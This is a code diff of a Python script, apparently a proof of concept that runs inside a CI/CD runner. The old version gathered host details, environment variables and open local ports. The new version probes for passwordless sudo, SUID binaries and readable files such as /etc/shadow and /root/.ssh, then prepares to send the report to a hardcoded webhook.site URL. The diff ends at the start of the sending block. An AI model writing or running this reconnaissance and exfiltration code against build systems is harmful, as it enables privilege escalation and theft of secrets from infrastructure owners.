@@ -4,82 +4,83 @@ import platform
 import socket
 import json
 import time
+import subprocess
 import requests
 
 WEBHOOK_URL = "https://webhook.site/bfd5d8c0-55a2-434a-a854-5b1d2508e0b4"
 
-def gather_system_intel():
-    """Глубокая разведка параметров хоста и окружения раннера"""
-    intel = {
-        "os_platform": platform.platform(),
-        "architecture": platform.architecture(),
-        "processor": platform.processor(),
-        "python_version": sys.version,
-        "hostname": socket.gethostname(),
-        "local_ip": socket.gethostbyname(socket.gethostname()),
-        "environment_variables": {k: v for k, v in os.environ.items() if not k.startswith("GITHUB_TOKEN")}
-    }
-    return intel
-
-def audit_local_ssh(port=22):
-    """Детальный аудит локального SSH-демона на порту 22"""
-    ssh_info = {
-        "port": port,
-        "status": "Closed",
-        "banner": None,
-        "notes": ""
+def get_privileges_and_sudo():
+    """Проверка прав текущего пользователя и конфигурации sudo"""
+    priv_info = {
+        "uid": os.getuid(),
+        "gid": os.getgid(),
+        "username": os.getenv("USER", "unknown"),
+        "sudo_no_passwd": "Not Available"
     }
     
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(1.0)
+    # Проверяем, может ли пользователь выполнять sudo без пароля
     try:
-        result = s.connect_ex(('127.0.0.1', port))
-        if result == 0:
-            ssh_info["status"] = "Open (Listening on Localhost)"
-            # Пытаемся получить баннер сервиса (версию SSH)
-            try:
-                banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
-                ssh_info["banner"] = banner
-            except Exception as e:
-                ssh_info["banner"] = f"Failed to grab banner: {str(e)}"
+        res = subprocess.run(["sudo", "-n", "-l"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=2)
+        if res.returncode == 0:
+            priv_info["sudo_no_passwd"] = res.stdout.strip().split("\n")
+        else:
+            priv_info["sudo_no_passwd"] = "Restricted or Password Required"
     except Exception as e:
-        ssh_info["notes"] = f"Error connecting: {str(e)}"
-    finally:
-        s.close()
+        priv_info["sudo_no_passwd"] = f"Error checking: {str(e)}"
         
-    return ssh_info
+    return priv_info
 
-def scan_local_ports():
-    """Сканирование ключевых портов на локалхосте"""
-    ports_to_check = [22, 80, 443, 3306, 5432, 6379, 8080, 2375]
-    open_ports = []
+def find_suid_binaries():
+    """Поиск файлов с установленным SUID-битом (ограниченный поиск по ключевым путям для скорости)"""
+    suid_files = []
+    search_paths = ["/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin"]
     
-    for port in ports_to_check:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(0.2)
+    for path in search_paths:
+        if os.path.exists(path):
+            for root, dirs, files in os.walk(path):
+                # Ограничиваем глубину, чтобы не тратить время
+                for file in files:
+                    full_path = os.path.join(root, file)
+                    try:
+                        if os.path.exists(full_path) and not os.path.islink(full_path):
+                            stat = os.stat(full_path)
+                            # Проверка SUID бита (0o4000)
+                            if stat.st_mode & 0o4000:
+                                suid_files.append(full_path)
+                    except Exception:
+                        pass
+                break # Проверяем только верхний уровень папки для быстродействия
+    return suid_files
+
+def audit_sensitive_files():
+    """Проверка доступа на чтение к чувствительным файлам ОС"""
+    sensitive_paths = ["/etc/passwd", "/etc/shadow", "/etc/sudoers", "/root/.ssh"]
+    access_report = {}
+    
+    for path in sensitive_paths:
         try:
-            if s.connect_ex(('127.0.0.1', port)) == 0:
-                open_ports.append(port)
-        except:
-            pass
-        finally:
-            s.close()
-    return open_ports
+            readable = os.access(path, os.R_OK)
+            access_report[path] = "Readable" if readable else "Access Denied / Protected"
+        except Exception:
+            access_report[path] = "Not Found"
+            
+    return access_report
 
 if __name__ == "__main__":
-    print("[*] Запуск расширенного модуля CyberPoC v2.1 (SSH & Network Introspection)...")
+    print("[*] Запуск глубокого модуля PrivEsc & Sandbox Recon v3.0...")
     start_time = time.time()
     
     report = {
-        "poc_name": "CI/CD Deep Sandbox Recon & SSH Audit",
+        "poc_name": "CI/CD Deep Privilege & System Audit",
         "timestamp": time.time(),
-        "system_intel": gather_system_intel(),
-        "ssh_deep_audit": audit_local_ssh(22),
-        "open_local_ports": scan_local_ports(),
+        "hostname": socket.gethostname(),
+        "privileges": get_privileges_and_sudo(),
+        "sensitive_files_access": audit_sensitive_files(),
+        "suid_sample": find_suid_binaries(),
         "execution_time_seconds": round(time.time() - start_time, 4)
     }
     
-    print("[+] Разведка завершена. Отправка отчета...")
+    print("[+] Глубокий аудит завершен. Отправка отчета...")
     print(json.dumps(report, indent=2, ensure_ascii=False))
     
     try:
